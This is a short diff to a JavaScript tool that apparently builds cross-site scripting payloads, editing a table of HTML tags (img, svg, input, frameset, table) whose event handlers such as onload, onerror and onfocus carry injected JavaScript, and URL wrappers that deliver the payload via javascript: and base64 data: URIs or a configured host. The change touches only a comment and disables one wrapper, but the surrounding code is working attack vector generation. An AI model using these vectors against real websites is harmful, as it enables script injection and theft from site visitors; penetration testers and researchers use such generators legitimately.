@@ -21,7 +21,7 @@ var caps = {
     {'tagName': 'img', 'attributes': {'src': ['X-url', 'image'], 'onload': ['X-payload', 'text/javascript']} },
     {'tagName': 'img', 'attributes': {'src': 'x', 'onerror': ['X-payload', 'text/javascript']} },
     {"tagName": "frameset", "attributes": {'onload': ['X-payload', 'text/javascript'] } },
-    {"tagName": "input", "attributes": {"autofocus": "", "onfocus": ['X-payload', 'text/javascript']}}, //TODO make autofocus thing work
+    {"tagName": "input", "attributes": {"autofocus": "", "onfocus": ['X-payload', 'text/javascript']}}, //TODO doesnt work in frames :/
     {"tagName": "svg", "attributes": {"onload": ['X-payload', 'text/javascript']}},
     {"tagName": "table", "attributes": {"background": ['X-url', 'text/javascript']}},
     {"tagName": "A", "attributes": {"folder": ['X-url', 'text/javascript'],"style": "behavior:url(#default#AnchorClick);"}, "content": ['X-payload','text']},
@@ -136,7 +136,10 @@ function makeURL(contenttype) {
       if (type !== 'text/javascript') { return URL_LAYERS['http'](path, type); }
       return 'javascript:' + makePayload(path);
     },
-    'data:': function(path, type) { return 'data:' +type+ ',' + makePayload(path);  },
+    /* 'data:': function(path, type) {
+      //TODO: think about how to make this fall-back to b64 if binary data are there...
+      return 'data:' +type+ ',' + makePayload(path);
+    }, */
     'data-base64': function(path, type) { return 'data:' +type+ ';base64,' + btoa(makePayload(path));  },
     'http': function(path, type) { return 'http://' + CONFIG_HOST + '/' + CONFIG_PATH + '/' + path;  },
     ///TODO add https
